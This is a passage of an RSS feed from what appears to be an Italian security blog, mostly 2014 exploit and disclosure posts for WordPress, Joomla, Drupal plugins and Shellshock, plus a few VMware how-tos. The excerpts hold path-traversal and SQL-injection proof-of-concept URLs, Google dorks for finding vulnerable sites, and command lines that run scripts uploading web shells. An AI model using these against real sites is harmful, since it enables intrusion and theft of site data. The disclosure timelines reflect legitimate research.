+      <link>https://www.homelab.it/index.php/2015/02/11/wordpress-video-gallery-2-7-sql-injection/</link>
+      <pubDate>Wed, 11 Feb 2015 22:43:44 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/02/11/wordpress-video-gallery-2-7-sql-injection/</guid>
+      <description>####################### Exploit Title : WordPress Video Gallery 2.7 SQL Injection Vulnerabilitiy# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery# Software Link : https://downloads.wordpress.org/plugin/contus-video-gallery.2.7.zip# Dork Google: inurl:/wp-admin/admin-ajax.php?action=rss# Date : 2015-02-10# Tested on : Windows 7 / Mozilla FirefoxLinux / Mozilla Firefox ####################### Vulnerability Disclosure Timeline:2015-02-08: Discovered vulnerability2015-02-09: Vendor Notification2015-02-10: Vendor Response/Feedback 2015-02-10: Vendor Send Fix/Patch 2015-02-10: Public Disclosure # DescriptionWordpress Video Gallery 2.</description>
+    </item>
+    
+    <item>
+      <title>Come aggiornare VMware vCenter 5</title>
+      <link>https://www.homelab.it/index.php/2015/01/02/come-aggiornare-vmware-vcenter-5/</link>
+      <pubDate>Fri, 02 Jan 2015 10:30:24 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2015/01/02/come-aggiornare-vmware-vcenter-5/</guid>
+      <description>OS: Windows 2008 R2 x64
+vCenter Server: 5.0
+Intro In questo articolo mostrerò come aggiornare VMware vCenter , in particolare dalla versione 5.0 alla 5.5U2.
+Il sistema operativo da dove effettuerò le operazione è Windows 2008 R2 x64.
+Requisiti Per aggiornare vCenter è necessario procurarsi la versione più aggiornata, per fare ciò basta loggarsi con il proprio account sul sito My VMware e
+cercare sotto la sezione Downloads -&amp;gt; All Products la parola chiave “VMware vCenter Server“.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Download Manager Remote Code Execution Vulnerability (Add WP Admin)</title>
+      <link>https://www.homelab.it/index.php/2014/12/13/wordpress-download-manager-rce/</link>
+      <pubDate>Sat, 13 Dec 2014 21:17:38 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/12/13/wordpress-download-manager-rce/</guid>
+      <description>___ ___ __| Y .-----.----.--| .-----.----.-----.-----.-----.|. | | _ | _| _ | _ | _| -__|__ --|__ --||. / \ |_____|__| |_____| __|__| |_____|_____|_____||: | ______ |__| __ __|::.|:. | | _ \ .-----.--.--.--.-----| .-----.---.-.--| |`--- ---&amp;#39; |. | \| _ | | | | | | _ | _ | _ ||. | |_____|________|__|__|__|_____|___._|_____||: 1 / ___ ___|::.. .</description>
+    </item>
+    
+    <item>
+      <title>WordPress WP Symposium Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/12/11/wordpress-wp-symposium-shell-upload/</link>
+      <pubDate>Thu, 11 Dec 2014 22:24:20 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/12/11/wordpress-wp-symposium-shell-upload/</guid>
+      <description>___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---&amp;#39; ___ ___ _______ _______ __ | Y | _ |______| _ .--.--.--------.-----.-----.-----|__.--.--.--------. |. | |. 1 |______| 1___| | | | _ | _ |__ --| | | | | |. / \ |. ____| |____ |___ |__|__|__| __|_____|_____|__|_____|__|__|__| |: |: | |: 1 |_____| |__| |::.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Ajax Store Locator Arbitrary File Download Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/12/06/wordpress-ajax-store-locator-arbitrary-file-download-vulnerability/</link>
+      <pubDate>Sat, 06 Dec 2014 20:45:11 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/12/06/wordpress-ajax-store-locator-arbitrary-file-download-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Ajax Store Locator &amp;lt;= 1.2 Arbitrary File Download# Exploit Author : Claudio Viviani# Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356# Software Link : Premium# Dork Google: inurl:ajax-store-locator# index of ajax-store-locator # Date : 2014-12-06# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### PoC Exploit:http://TARGET/wp-content/plugins/ajax-store-locator-wordpress/sl_file_download.php?download_file=[../../nomefile]orhttp://TARGET/wp-content/plugins/codecanyon-5293356-ajax-store-locator-wordpress/sl_file_download.php?download_file=[../../nomefile]&amp;#34;download_file&amp;#34; variable is not sanitized.#####################Discovered By : Claudio Vivianihttp://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress wpDataTables 1.5.3 and below Unauthenticated Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-shell-upload-vulnerability/</link>
+      <pubDate>Sun, 23 Nov 2014 03:05:12 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-shell-upload-vulnerability/</guid>
+      <description>claudio@backbox3:~/claudio$ python wpdatatables_shell_up.py -t http://10.0.0.67/wordpress -f shell.php ___ ___ __ | Y .-----.----.--| .-----.----.-----.-----.-----. |. | | _ | _| _ | _ | _| -__|__ --|__ --| |. / \ |_____|__| |_____| __|__| |_____|_____|_____| |: | |__| |::.|:. | `--- ---&amp;#39; ___ ___ ______ __ _______ __ __ | Y .-----| _ \ .---.-| |_.---.-| .---.-| |--| .-----.-----. |. | | _ |. | \| _ | _| _ |.</description>
+    </item>
+    
+    <item>
+      <title>WordPress wpDataTables SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-sql-injection-vulnerability/</link>
+      <pubDate>Sun, 23 Nov 2014 03:05:09 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/23/wordpress-wpdatatables-sql-injection-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress wpDataTables 1.5.3 and below SQL Injection Vulnerability# Exploit Author : Claudio Viviani # Software Link : http://wpdatatables.com (Premium)# Date : 2014-11-22# Tested on : Windows 7 / Mozilla FirefoxWindows 7 / sqlmap (0.8-1)Linux / Mozilla FirefoxLinux / sqlmap 1.0-dev-5b2ded0####################### DescriptionWordpress wpDataTables 1.5.3 and below suffers from SQL injection vulnerability&amp;#34;table_id&amp;#34; variable is not sanitized.File: wpdatatables.</description>
+    </item>
+    
+    <item>
+      <title>Joomla HD FLV Player Arbitrary File Download Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/11/15/joomla-hd-flv-player-arbitrary-file-download-vulnerability/</link>
+      <pubDate>Sat, 15 Nov 2014 00:53:14 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/15/joomla-hd-flv-player-arbitrary-file-download-vulnerability/</guid>
+      <description>Info # Exploit Title : Joomla HD FLV 2.1.0.1 and below Arbitrary File Download Vulnerability## Exploit Author : Claudio Viviani## Vendor Homepage : http://www.hdflvplayer.net/## Software Link : http://www.hdflvplayer.net/download_count.php?pid=5## Dork google 1: inurl:/component/hdflvplayer/# Dork google 2: inurl:com_hdflvplayer ## Date : 2014-11-11## Tested on : BackBox 3.x/4.x## Info: # Url: http://target/components/com_hdflvplayer/hdflvplayer/download.php?f=# The variable &amp;#34;f&amp;#34; is not sanitized.# Over 80.</description>
+    </item>
+    
+    <item>
+      <title>Joomla HD FLV Player SQL Injection Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/11/13/joomla-hd-flv-player-sql-injection-vulnerability/</link>
+      <pubDate>Thu, 13 Nov 2014 00:20:47 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/13/joomla-hd-flv-player-sql-injection-vulnerability/</guid>
+      <description>Info # Exploit Title : Joomla HD FLV Player 2.1.0.1 and below SQL Injection## Exploit Author : Claudio Viviani## Vendor Homepage : http://www.hdflvplayer.net/## Software Link : http://www.hdflvplayer.net/download_count.php?pid=5## Dork google 1: inurl:/component/hdflvplayer/# Dork google 2: inurl:com_hdflvplayer ## Date : 2014-11-11## Tested on : BackBox 3.x/4.x## Info: The variable &amp;#34;id&amp;#34; is not sanitized (again)# Over 80.000 downloads (statistic reported on official site)### Video Demo: http://youtu.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Brute Force Multithreading</title>
+      <link>https://www.homelab.it/index.php/2014/11/03/wordpress-brute-force-multithreading/</link>
+      <pubDate>Mon, 03 Nov 2014 22:27:08 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/03/wordpress-brute-force-multithreading/</guid>
+      <description>THE PROJECT WAS MOVED TO GITHUB: https://github.com/claudioviviani/wordbrutepress</description>
+    </item>
+    
+    <item>
+      <title>WordPress e Python: Come autenticarsi al famoso CMS con python</title>
+      <link>https://www.homelab.it/index.php/2014/11/02/wordpress-e-python-come-autenticarsi/</link>
+      <pubDate>Sun, 02 Nov 2014 21:06:53 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/11/02/wordpress-e-python-come-autenticarsi/</guid>
+      <description>Intro Dopo aver pubblicato vari exploit e vulnerabilità, sono tornato a scrivere un articolo dove poter condividere piccole nozioni tecniche che ho acquisito recentemente.
+Negli ultimi mesi mi sono dedicato soprattutto ad analizzare codici php di vari plugins wordpress e alla programmazione in python.
+Dato che molte vulnerabilità dei plugins wordpress richiedevano un utente (privilegiato e non) con accesso all’area riservata ho pensato: perché non scrivere gli exploit in python per automatizzare il tutto?</description>
+    </item>
+    
+    <item>
+      <title>Joomla RD Download Sql Injection</title>
+      <link>https://www.homelab.it/index.php/2014/10/29/joomla-rd-download-sql-injection/</link>
+      <pubDate>Wed, 29 Oct 2014 14:55:07 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/29/joomla-rd-download-sql-injection/</guid>
+      <description>claudio@backbox3:~$ python j00m_com_rd_download_sql_injection.py -t http://127.0.0.1_______ __ | _ .-----.-----.--------| .---.-. |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.. . | `-------&amp;#39; _______ ______ ______ __ __ | _ | _ \ | _ \ .-----.--.--.--.-----| .-----.---.-.--| ||. l |. | \ |. | \| _ | | | | | | _ | _ | _ ||. _ |.</description>
+    </item>
+    
+    <item>
+      <title>WordPress and Joomla Creative Contact Form Unauthenticated Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/10/24/creative-contact-form-unauthenticated-shell-upload/</link>
+      <pubDate>Thu, 23 Oct 2014 22:19:50 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/24/creative-contact-form-unauthenticated-shell-upload/</guid>
+      <description>claudio@backbox3:~$ python wp_j00m_creative_contact_form_shell_upload.py -t http://127.0.0.1/wordpress -f shell.php -c wordpress___ ___ __ __,-,__ | Y .-----.----.--| .-----.----.-----.-----. | &amp;#39; &amp;#39;__| |. | | _ | _| _ | _ | _| -__|__ --| | __| |. / \ |_____|__| |_____| __|__| |_____|_____| |_______| |: | _______ |__| __ |_| |::.|:. | | _ .-----.-----.--------| .---.-. `--- ---&amp;#39; |___| | _ | _ | | | _ | |. | |_____|_____|__|__|__|__|___._| |: 1 | |::.</description>
+    </item>
+    
+    <item>
+      <title>WordPress CP Multi View Event Calendar 1.01 Sql Injection</title>
+      <link>https://www.homelab.it/index.php/2014/10/23/wordpress-cp-multi-view-event-calendar-1-01-sql-injection/</link>
+      <pubDate>Wed, 22 Oct 2014 23:37:14 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/23/wordpress-cp-multi-view-event-calendar-1-01-sql-injection/</guid>
+      <description>####################### Exploit Title : WordPress CP Multi View Event Calendar 1.01 SQL Injection Vulnerability# Exploit Author : Claudio Viviani # Software Link : https://downloads.wordpress.org/plugin/cp-multi-view-calendar.zip# Date : 2014-10-23# Tested on : Windows 7 / Mozilla FirefoxWindows 7 / sqlmap (0.8-1)Linux / Mozilla FirefoxLinux / sqlmap 1.0-dev-5b2ded0####################### DescriptionCP Multi View Event Calendar 1.01 suffers from SQL injection vulnerabilitycalid variable is not sanitized.</description>
+    </item>
+    
+    <item>
+      <title>Drupal 7 Sql Injection SA-CORE-2014-005 CVE-2014-3704</title>
+      <link>https://www.homelab.it/index.php/2014/10/17/drupal-7-sql-injection/</link>
+      <pubDate>Thu, 16 Oct 2014 23:05:24 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/17/drupal-7-sql-injection/</guid>
+      <description>claudio@backbox3:~$ ./drupal.py -t http://127.0.0.1/drupal -u 4dm1n -p p4ssw0rd______ __ _______ _______ _____ | _ \ .----.--.--.-----.---.-| | | _ || _ | _ | |. | \| _| | | _ | _ | | |___| _|___| |.| | |. | |__| |_____| __|___._|__| / |___(__ `-|. | |: 1 / |__| | | |: 1 | |: | |::.. . / | | |::.. . | |::.| `------&amp;#39; `---&amp;#39; `-------&amp;#39; `---&amp;#39; _______ __ ___ __ __ __ | _ .</description>
+    </item>
+    
+    <item>
+      <title>How to install Faraday Community Edition on BackBox Linux 3</title>
+      <link>https://www.homelab.it/index.php/2014/10/11/how-to-install-faraday-on-backbox-linux-3/</link>
+      <pubDate>Sat, 11 Oct 2014 17:53:52 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/11/how-to-install-faraday-on-backbox-linux-3/</guid>
+      <description>Tested on:
+Faraday Community Edition
+BackBox Linux 3.x x86_64
+ Download Faraday   claudio@backbox3:~$ wget https://github.com/infobyte/faraday/archive/master.zip Install requirements   claudio@backbox3:~$ sudo pip install psycopg2Downloading/unpacking psycopg2Running setup.py egg_info for package psycopg2Installing collected packages: psycopg2Running setup.py install for psycopg2Successfully installed psycopg2Cleaning up...claudio@backbox3:~$ Modify installation script   claudio@backbox3:~$ unzip master.zipclaudio@backbox3:~$ cd faraday-master/claudio@backbox3:~/faraday-master$ lsapis AUTHORS config data deps exporters faraday.py gui install.</description>
+    </item>
+    
+    <item>
+      <title>Come installare Windows OEM su VMware ESXi</title>
+      <link>https://www.homelab.it/index.php/2014/10/04/come-installare-windows-oem-vmware-esxi/</link>
+      <pubDate>Sat, 04 Oct 2014 00:21:29 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/10/04/come-installare-windows-oem-vmware-esxi/</guid>
+      <description>Avete un server HP, Dell o IBM con VMware ESXi e volete installare una macchina virtuale windows utilizzando il relativo CD OEM?
+Avete già effettuato un tentativo ma vi siete imbattuti in questo tipo d’errore?
+Bene, anzi male, ma vi trovate nella pagina giusta per risolvere il problema.
+Questi supporti con sistemi windows OEM sono predisposti di controlli in modo da poter essere eseguiti solo su hardware specifico.
+Per aggirare queste protezioni basta inserire una particolare opzione all’interno della configurazione della macchina virtuale.</description>
+    </item>
+    
+    <item>
+      <title>IPFire Cgi Web Interface Authenticated Bash Environment Variable Code Injection exploit</title>
+      <link>https://www.homelab.it/index.php/2014/09/29/ipfire-cgi-web-interface-authenticated-bash-environment-variable-code-injection-exploit/</link>
+      <pubDate>Mon, 29 Sep 2014 21:58:48 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/29/ipfire-cgi-web-interface-authenticated-bash-environment-variable-code-injection-exploit/</guid>
+      <description>[claudio@localhost ~]$ python ipfire_cgi_shellshock.py___ _______ _______ __ _______ __| | _ | _ |__.----.-----. | _ .-----|__||. |. 1 |. 1___| | _| -__| |. 1___| _ | ||. |. ____|. __) |__|__| |_____| |. |___|___ |__||: |: | |: | |: 1 |_____||::.|::.| |::.| |::.. . |`---`---&amp;#39; `---&amp;#39; `-------&amp;#39;_______ __ __ __ _______ __ __| _ | |--.-----| | | _ | |--.</description>
+    </item>
+    
+    <item>
+      <title>Gnu Bash 4.3 and below Cgi Scan &#43; Remote Command Injection Exploit</title>
+      <link>https://www.homelab.it/index.php/2014/09/26/gnu-bash-4-3-and-below-remote-command-injection-exploit/</link>
+      <pubDate>Fri, 26 Sep 2014 11:31:37 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/26/gnu-bash-4-3-and-below-remote-command-injection-exploit/</guid>
+      <description>[claudio@localhost ~]$ ./bash_env_rci_v2.py_______ _______ __| _ .-----.--.--. | _ .---.-.-----| |--.|. |___| | | | |. 1 | _ |__ --| ||. | |__|__|_____| |. _ |___._|_____|__|__||: 1 | |: 1 \|::.. . | |::.. . /`-------&amp;#39; `-------&amp;#39;___ ___ _______ _______ _______ ___| Y | | _ | | _ | _ | || | |_|___| | |. l |. 1___|.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Face Gallery 1.0 Multiple Vulnerabilities</title>
+      <link>https://www.homelab.it/index.php/2014/09/22/joomla-face-gallery-1-0-multiple-vulnerabilities/</link>
+      <pubDate>Sun, 21 Sep 2014 22:57:48 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/22/joomla-face-gallery-1-0-multiple-vulnerabilities/</guid>
+      <description>####################### Exploit Title : Joomla Face Gallery 1.0 Multiple Vulnerabilities# Exploit Author : Claudio Viviani# Vendor Homepage : https://www.apptha.com# Software Link : https://www.apptha.com/downloadable/download/sample/sample_id/150# Dork Google: inurl:option=com_facegallery# Date : 2014-09-17# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Info:# Joomla Face Gallery 1.0 suffers from SQL injection and Arbitrary file download vulnerabilities# PoC Exploit:## http://localhost/index.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Mac Gallery 1.5 and below Arbitrary File Download vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/09/21/joomla-mac-gallery-1-5-and-below-arbitrary-file-download-vulnerability/</link>
+      <pubDate>Sun, 21 Sep 2014 13:33:39 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/21/joomla-mac-gallery-1-5-and-below-arbitrary-file-download-vulnerability/</guid>
+      <description>####################### Exploit Title : Joomla Mac Gallery &amp;lt;= 1.5 Arbitrary File Download# Exploit Author : Claudio Viviani# Vendor Homepage : https://www.apptha.com# Software Link : https://www.apptha.com/downloadable/download/sample/sample_id/18# Dork Google: inurl:option=com_macgallery# Date : 2014-09-17# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Info:# Joomla Mac Gallery suffers from Arbitrary File Download vulnerability# PoC Exploit:# http://localhost/index.php?option=com_macgallery&amp;amp;view=download&amp;amp;albumid=[../../filename]# &amp;#34;album_id&amp;#34; variable is not sanitized.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Slideshow Gallery 1.4.6 Shell Upload Exploit &#43; Demo</title>
+      <link>https://www.homelab.it/index.php/2014/09/16/wordpress-slideshow-gallery-1-4-6-shell-upload-exploit/</link>
+      <pubDate>Tue, 16 Sep 2014 08:19:21 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/16/wordpress-slideshow-gallery-1-4-6-shell-upload-exploit/</guid>
+      <description>[claudio@localhost ~]$ python wp_gallery_slideshow_146_suv.py -t http://localhost/wordpress -u editor -p editor -f sh33l.php$$$$$$\ $$\ $$\ $$\ $$\$$ __$$\ $$ |\__| $$ | $$ |$$ / \__|$$ |$$\ $$$$$$$ | $$$$$$\ $$$$$$$\ $$$$$$$\ $$$$$$\ $$\ $$\ $$\\$$$$$$\ $$ |$$ |$$ __$$ |$$ __$$\ $$ _____|$$ __$$\ $$ __$$\ $$ | $$ | $$ |\____$$\ $$ |$$ |$$ / $$ |$$$$$$$$ |\$$$$$$\ $$ | $$ |$$ / $$ |$$ | $$ | $$ |$$\ $$ |$$ |$$ |$$ | $$ |$$ ____| \____$$\ $$ | $$ |$$ | $$ |$$ | $$ | $$ |\$$$$$$ |$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$$$$$$ |$$ | $$ |\$$$$$$ |\$$$$$\$$$$ |\______/ \__|\__| \_______| \_______|\_______/ \__| \__| \______/ \_____\____/$$$$$$\ $$\ $$\ $$\ $$\ $$\ $$$$$$\$$ __$$\ $$ |$$ | $$$$ |$$ | $$ | $$ __$$\$$ / \__| $$$$$$\ $$ |$$ | $$$$$$\ $$$$$$\ $$\ $$\ \_$$ |$$ | $$ | $$ / \__|$$ |$$$$\ \____$$\ $$ |$$ |$$ __$$\ $$ __$$\ $$ | $$ | $$ |$$$$$$$$ | $$$$$$$\$$ |\_$$ | $$$$$$$ |$$ |$$ |$$$$$$$$ |$$ | \__|$$ | $$ | $$ |\_____$$ | $$ __$$\$$ | $$ |$$ __$$ |$$ |$$ |$$ ____|$$ | $$ | $$ | $$ | $$ | $$ / $$ |\$$$$$$ |\$$$$$$$ |$$ |$$ |\$$$$$$$\ $$ | \$$$$$$$ | $$$$$$\ $$\ $$ |$$\ $$$$$$ |\______/ \_______|\__|\__| \_______|\__| \____$$ | \______|\__|\__|\__|\______/$$\ $$ |\$$$$$$ |\______/W0rdpr3ss Sl1d3sh04w G4ll3ry 1.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider Form Maker 3.4 and below SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/09/13/joomla-spider-form-maker-4-3-sql-injection/</link>
+      <pubDate>Fri, 12 Sep 2014 22:24:40 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/13/joomla-spider-form-maker-4-3-sql-injection/</guid>
+      <description>####################### Exploit Title : Joomla Spider Form Maker &amp;lt;= 3.4 SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://web-dorado.com/# Software Link : http://web-dorado.com/products/joomla-form.html# Dork Google: inurl:com_formmaker# Date : 2014-09-07# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### PoC Exploit:http://localhost/index.php?option=com_formmaker&amp;amp;view=formmaker&amp;amp;id=[SQLi]&amp;#34;id&amp;#34; variable is not sanitized.####################### Vulnerability Disclosure Timeline:2014-09-07: Discovered vulnerability2014-09-09: Vendor Notification2014-09-10: Vendor Response/Feedback2014-09-10: Vendor Fix/Patch2014-09-10: Public Disclosure#####################Discovered By : Claudio Vivianihttp://www.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider Contacts 1.3.6 and below SQL Injection vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/09/10/joomla-spider-contacts-1-3-6-and-below-sql-injection-vulnerability/</link>
+      <pubDate>Wed, 10 Sep 2014 21:21:09 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/10/joomla-spider-contacts-1-3-6-and-below-sql-injection-vulnerability/</guid>
+      <description>$$$$$\ $$\ $$$$$$\ $$\ $$\\__$$ | $$ | $$ __$$\ \__| $$ |$$ | $$$$$$\ $$$$$$\ $$$$$$\$$$$\ $$ | $$$$$$\ $$ / \__| $$$$$$\ $$\ $$$$$$$ | $$$$$$\ $$$$$$\$$ |$$ __$$\ $$ __$$\ $$ _$$ _$$\ $$ | \____$$\ \$$$$$$\ $$ __$$\ $$ |$$ __$$ |$$ __$$\ $$ __$$\$$\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \____$$\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \__|$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\$$$$$$ |\$$$$$$ |\$$$$$$ |$$ | $$ | $$ |$$ |\$$$$$$$ | \$$$$$$ |$$$$$$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$ |\______/ \______/ \______/ \__| \__| \__|\__| \_______| \______/ $$ ____/ \__| \_______| \_______|\__|$$ |$$ |\__|$$$$$$\ $$\ $$\ $$\ $$$$$$\ $$$$$$\$$ __$$\ $$ | $$ | $$$$ | $$ ___$$\ $$ __$$\$$ / \__| $$$$$$\ $$$$$$$\ $$$$$$\ $$$$$$\ $$$$$$$\ $$$$$$\ $$$$$$$\ \_$$ | \_/ $$ | $$ / \__|$$ | $$ __$$\ $$ __$$\_$$ _| \____$$\ $$ _____|\_$$ _| $$ _____| $$ | $$$$$ / $$$$$$$\$$ | $$ / $$ |$$ | $$ | $$ | $$$$$$$ |$$ / $$ | \$$$$$$\ $$ | \___$$\ $$ __$$\$$ | $$\ $$ | $$ |$$ | $$ | $$ |$$\ $$ __$$ |$$ | $$ |$$\ \____$$\ $$ | $$\ $$ | $$ / $$ |\$$$$$$ |\$$$$$$ |$$ | $$ | \$$$$ |\$$$$$$$ |\$$$$$$$\ \$$$$ |$$$$$$$ | $$$$$$\ $$\$$$$$$ |$$\ $$$$$$ |\______/ \______/ \__| \__| \____/ \_______| \_______| \____/ \_______/ \______|\__|\______/ \__|\______/j00ml4 Spid3r C0nt4cts &amp;lt;= 1.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider Calendar 3.2.6 SQL Injection Exploit &#43; Demo</title>
+      <link>https://www.homelab.it/index.php/2014/09/06/joomla-spider-calendar-3-2-6-sql-injection-vulnerability/</link>
+      <pubDate>Sat, 06 Sep 2014 09:16:25 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/06/joomla-spider-calendar-3-2-6-sql-injection-vulnerability/</guid>
+      <description>$$$$$\ $$\ $$$$$$\ $$\ $$\\__$$ | $$ | $$ __$$\ \__| $$ |$$ | $$$$$$\ $$$$$$\ $$$$$$\$$$$\ $$ | $$$$$$\ $$ / \__| $$$$$$\ $$\ $$$$$$$ | $$$$$$\ $$$$$$\$$ |$$ __$$\ $$ __$$\ $$ _$$ _$$\ $$ | \____$$\ \$$$$$$\ $$ __$$\ $$ |$$ __$$ |$$ __$$\ $$ __$$\$$\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \____$$\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \__|$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\$$$$$$ |\$$$$$$ |\$$$$$$ |$$ | $$ | $$ |$$ |\$$$$$$$ | \$$$$$$ |$$$$$$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$ |\______/ \______/ \______/ \__| \__| \__|\__| \_______| \______/ $$ ____/ \__| \_______| \_______|\__|$$ |$$ |\__|$$$$$$\ $$\ $$\ $$$$$$\ $$$$$$\ $$$$$$\$$ __$$\ $$ | $$ | $$ ___$$\ $$ __$$\ $$ __$$\$$ / \__| $$$$$$\ $$ | $$$$$$\ $$$$$$$\ $$$$$$$ | $$$$$$\ $$$$$$\ \_/ $$ | \__/ $$ | $$ / \__|$$ | \____$$\ $$ |$$ __$$\ $$ __$$\ $$ __$$ | \____$$\ $$ __$$\ $$$$$ / $$$$$$ | $$$$$$$\$$ | $$$$$$$ |$$ |$$$$$$$$ |$$ | $$ |$$ / $$ | $$$$$$$ |$$ | \__| \___$$\ $$ ____/ $$ __$$\$$ | $$\ $$ __$$ |$$ |$$ ____|$$ | $$ |$$ | $$ |$$ __$$ |$$ | $$\ $$ | $$ | $$ / $$ |\$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\ $$ | $$ |\$$$$$$$ |\$$$$$$$ |$$ | \$$$$$$ |$$\ $$$$$$$$\ $$\ $$$$$$ |\______/ \_______|\__| \_______|\__| \__| \_______| \_______|\__| \______/ \__|\________|\__|\______/j00ml4 Spid3r C4l3nd4r &amp;gt;= 2.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Spider Facebook 1.0.8 Authenticated SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/09/05/wordpress-spider-facebook-1-0-8-authenticated-sql-injection/</link>
+      <pubDate>Fri, 05 Sep 2014 14:48:40 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/05/wordpress-spider-facebook-1-0-8-authenticated-sql-injection/</guid>
+      <description>####################### Exploit Title : WordPress Spider Facebook 1.0.8 Authenticated SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://web-dorado.com/# Software Link : http://downloads.wordpress.org/plugin/spider-facebook.1.0.8.zip# Date : 2014-08-25# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Linux / sqlmap 1.0-dev-5b2ded0####################### Location : http://localhost/wp-content/plugins/plugins/spider-facebook/facebook.php####################### Vulnerable code :function Spider_Facebook_manage(){require_once(&amp;#34;facebook_manager.php&amp;#34;);require_once(&amp;#34;facbook_manager.html.php&amp;#34;);if(!function_exists (&amp;#39;print_html_nav&amp;#39; ))require_once(&amp;#34;nav_function/nav_html_func.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Huge-IT Image Gallery 1.0.1 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/09/02/wordpress-huge-it-image-gallery-1-0-1-sql-injection/</link>
+      <pubDate>Mon, 01 Sep 2014 22:07:22 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/02/wordpress-huge-it-image-gallery-1-0-1-sql-injection/</guid>
